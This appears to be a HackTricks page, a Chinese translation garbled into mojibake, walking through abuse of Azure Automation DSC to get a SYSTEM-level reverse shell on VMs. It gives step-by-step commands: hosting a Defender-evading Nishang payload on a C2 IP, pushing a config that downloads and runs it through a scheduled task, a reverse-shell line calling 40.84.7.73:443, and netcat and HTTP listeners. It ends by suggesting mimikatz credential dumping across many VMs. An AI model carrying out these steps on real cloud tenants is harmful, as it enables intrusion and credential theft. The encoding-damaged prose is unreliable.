# Az - State Configuration RCE

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

**æœ¬æ–‡æ‘˜è‡ª** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### è¿œç¨‹æœåŠ¡å™¨ (C2) åŸºç¡€è®¾æ–½å‡†å¤‡ <a href="#f0fa" id="f0fa"></a>

æˆ‘å°†åœ¨è¿œç¨‹æœåŠ¡å™¨â€œ40.84.7.74â€ä¸Šæ‰˜ç®¡ä¸€ä¸ªç²¾ç®€ç‰ˆçš„Nishang Invoke-PowerShellTcp.ps1æœ‰æ•ˆè½½è·ï¼Œè¯¥æœåŠ¡å™¨æ˜¯Kaliç›’å­ã€‚æœ‰æ•ˆè½½è·åç§°å°†æ˜¯â€œRevPS.ps1â€ã€‚ä¸ºäº†é˜²æ­¢Nishangè„šæœ¬å› ä»»ä½•åŸå› ï¼ˆä¹Ÿè®¸æ‚¨å®æ„¿å°†æ–‡ä»¶ä¿å­˜åˆ°ç£ç›˜ï¼‰è¢«Windows Defenderåˆ é™¤ï¼Œæˆ‘åœ¨è¿™é‡Œæœ‰ä¸€ä¸ªè½»é‡çº§ç‰ˆæœ¬ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥ç»•è¿‡Defenderï¼š[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1)ã€‚è¿™å°†ç”±Kaliç›’å­ä¸Šçš„ä¸€ä¸ªç®€å•Python Simple Serveræ‰˜ç®¡ã€‚

### æ­¥éª¤ 1 â€” åˆ›å»ºæ–‡ä»¶ <a href="#89de" id="89de"></a>

æˆ‘ä»¬éœ€è¦åˆ›å»ºå¦ä¸€ä¸ªDSCé…ç½®æ–‡ä»¶ã€‚æ¨¡æ¿å¯ä»¥åœ¨è¿™é‡Œä¸‹è½½ï¼š[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1)ã€‚è¿™ä¸ªé…ç½®æ–‡ä»¶å°†ä½¿ç”¨æˆ‘ä»¬ä¹‹å‰ä½¿ç”¨çš„ç›¸åŒæ–‡ä»¶å†™å…¥åŠŸèƒ½ã€‚è¿™æ¬¡ï¼Œå†…å®¹åŒ…æ‹¬ä»æˆ‘ä»¬çš„è¿œç¨‹æœåŠ¡å™¨ä¸‹è½½å’Œæ‰§è¡Œæœ‰æ•ˆè½½è·çš„ä»£ç ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬æ­£åœ¨ä½¿ç”¨_ComputerManagementDsc_æ¨¡å—ä¸­å¯ç”¨çš„è®¡åˆ’ä»»åŠ¡åŠŸèƒ½ã€‚è®¡åˆ’ä»»åŠ¡åŠŸèƒ½å°†æ˜¯æ‰§è¡Œçš„å…³é”®è§’è‰²ï¼Œå¹¶ç¨åä¸ºæˆ‘ä»¬æä¾›SYSTEMæƒé™ã€‚

æˆ‘ä»¬è¿˜å°†ä¸‹è½½ä¸€ä¸ªè„šæœ¬ï¼Œç”¨äºå°†æˆ‘ä»¬çš„é…ç½®å‘å¸ƒåˆ°VMã€‚å®ƒä½äºè¿™é‡Œï¼š[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1)ã€‚

è¿™äº›æ–‡ä»¶å°†ä½œä¸ºæ¨¡æ¿ã€‚**æ‚¨éœ€è¦ç”¨æ‚¨æ­£åœ¨ä½¿ç”¨çš„å˜é‡åç§°å’Œå‚æ•°å¡«å……**ã€‚è¿™åŒ…æ‹¬èµ„æºåç§°ã€æ–‡ä»¶è·¯å¾„ä»¥åŠæ‚¨æ­£åœ¨ä½¿ç”¨çš„å¤–éƒ¨æœåŠ¡å™¨/æœ‰æ•ˆè½½è·åç§°ã€‚è¯·å‚è€ƒä»£ç ä¸­çš„æ³¨é‡Šã€‚

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### æ­¥éª¤ 2 â€” å‹ç¼©é…ç½®æ–‡ä»¶ <a href="#c2c2" id="c2c2"></a>

åˆ›å»ºäº†ä¸¤ä¸ªæ–‡ä»¶åï¼Œæˆ‘ä»¬å°†**â€˜reverse\_shell\_config.ps1â€™** æ–‡ä»¶å‹ç¼©ï¼Œä»¥ä¾¿å¯ä»¥å‘é€åˆ°å­˜å‚¨è´¦æˆ·
```
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
### æ­¥éª¤ 3 â€” è®¾ç½®å­˜å‚¨ä¸Šä¸‹æ–‡å’Œä¸Šä¼  <a href="#bed9" id="bed9"></a>

æˆ‘ä»¬å°†å†æ¬¡è®¾ç½®å­˜å‚¨è´¦æˆ·çš„ä¸Šä¸‹æ–‡ï¼Œæˆ‘å·²ç»å®Œæˆäº†è¿™ä¸€æ­¥ã€‚æˆ‘å·²ç»æœ‰äº†ä¸€ä¸ªåä¸ºâ€˜**azure-pentest**â€™çš„å®¹å™¨ï¼Œæ‰€ä»¥æˆ‘å°†åœ¨è¿™é‡Œå‘å¸ƒæˆ‘çš„å†…å®¹ï¼š
```
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
### ç¬¬4æ­¥ â€” å‡†å¤‡Kaliç›’å­ <a href="#20fb" id="20fb"></a>

åœ¨æˆ‘ä»¬çš„Kaliç›’å­ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°ä½¿ç”¨_wget_æ¥è·å–æˆ‘ä»¬çš„PowerShellæœ‰æ•ˆè½½è·ã€‚åŸå§‹çš„åå‘Shellè„šæœ¬ä½äºè¿™é‡Œï¼š[https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1](https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1)ã€‚
```
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
```markdown
<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

æˆ‘ä»¬éœ€è¦ç¼–è¾‘åå‘ shell è„šæœ¬ï¼ŒåŠ å…¥æˆ‘ä»¬çš„å‚æ•°ï¼Œè¿™æ ·ä¸€æ—¦æ‰§è¡Œï¼ŒWindows VM å°±çŸ¥é“è¦è¿æ¥åˆ°å“ªé‡Œã€‚åœ¨æˆ‘çš„ä¾‹å­ä¸­ï¼Œæˆ‘æ·»åŠ äº†ä»¥ä¸‹å†…å®¹ï¼š
```
```
RevPShell -Reverse 40.84.7.73 443
```
### æ­¥éª¤ 5 â€” å‘å¸ƒé…ç½®æ–‡ä»¶ <a href="#9ad6" id="9ad6"></a>

ç°åœ¨æˆ‘ä»¬å°†è¿è¡Œæˆ‘ä»¬çš„é…ç½®æ–‡ä»¶ã€‚æˆ‘å°†æˆ‘çš„é…ç½®æ–‡ä»¶è®¾ç½®ä¸ºå‘å¸ƒåˆ°æ¡Œé¢ä»¥ä¾¿æ›´å¥½åœ°å¯è§†åŒ–ï¼Œä½†å®ƒå‡ ä¹å¯ä»¥å‘å¸ƒåˆ°ä»»ä½•åœ°æ–¹ã€‚å‡ åˆ†é’Ÿåï¼Œæˆ‘ä»¬å°†çœ‹åˆ°åå‘ shell è„šæœ¬å·²ç»å‘å¸ƒï¼

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### æ­¥éª¤ 6 â€” æ‰˜ç®¡æœ‰æ•ˆè½½è·å¹¶è®¾ç½®ç›‘å¬å™¨ <a href="#c55f" id="c55f"></a>

ä¸€æ—¦æˆ‘ä»¬å‘å¸ƒé…ç½®ï¼Œæˆ‘ä»¬å¯ä»¥åŒæ—¶å¯åŠ¨ä¸€ä¸ª Python SimpleHTTPServer åœ¨ 80 ç«¯å£ä¸Šæ‰˜ç®¡æœ‰æ•ˆè½½è·ï¼Œä»¥åŠä¸€ä¸ª netcat ç›‘å¬å™¨ä»¥æ•è·è¿æ¥ï¼š
```
sudo python -m SimpleHTTPServer 80sudo nc -nlvp 443
```
æˆ‘ä»¬çœ‹åˆ°è®¡åˆ’ä»»åŠ¡å·²ç»è¿è¡Œï¼Œæˆ‘ä»¬çš„æœ‰æ•ˆè½½è·è¢«æ£€ç´¢å¹¶ä»¥**SYSTEM**çº§åˆ«æƒé™åœ¨å†…å­˜ä¸­æ‰§è¡Œï¼

<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

### æ€»ç»“ <a href="#1ec2" id="1ec2"></a>

è¿™ä¸ºæˆ‘ä»¬æ‰“å¼€äº†è®¸å¤šå¯èƒ½æ€§ã€‚ç”±äºæˆ‘ä»¬æœ‰ä¸€ä¸ªä»¥**SYSTEM**è¿è¡Œçš„shellï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨mimikatzè½¬å‚¨å‡­æ®ï¼ˆå–å†³äºäº‘èµ„æºçš„EDRæˆç†Ÿåº¦ï¼Œè¿™å¯èƒ½æœ‰é£é™©ï¼‰ã€‚å¦‚æœä½ è½¬å‚¨äº†å‡­æ®ï¼Œå¾ˆæœ‰å¯èƒ½è¿™äº›å‡­æ®å¯ä»¥åœ¨ä¸åŒèµ„æºä¸­é‡å¤ä½¿ç”¨ã€‚æœ€åï¼Œä¸€ä¸ªé‡è¦çš„æ”¶è·æ˜¯ï¼Œä½ ç°åœ¨æœ‰èƒ½åŠ›å°†è¿™ä¸ªé…ç½®åº”ç”¨åˆ°å¤šä¸ªVMä¸Šï¼Œè€Œä¸ä»…é™äºä¸€ä¸ªVMã€‚

å°±æ­¤ï¼Œæˆ‘ä»¬çš„Azureè‡ªåŠ¨åŒ–DSCå†’é™©å°±ç»“æŸäº†ï¼æˆ‘å¸Œæœ›ä½ ç©å¾—å¼€å¿ƒï¼Œå­¦åˆ°äº†å¾ˆå¤šï¼Œå¹¶ç»§ç»­ç”¨ä½ è‡ªå·±çš„åˆ›é€ åŠ›æ‰©å±•çŸ¥è¯†ã€‚

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>
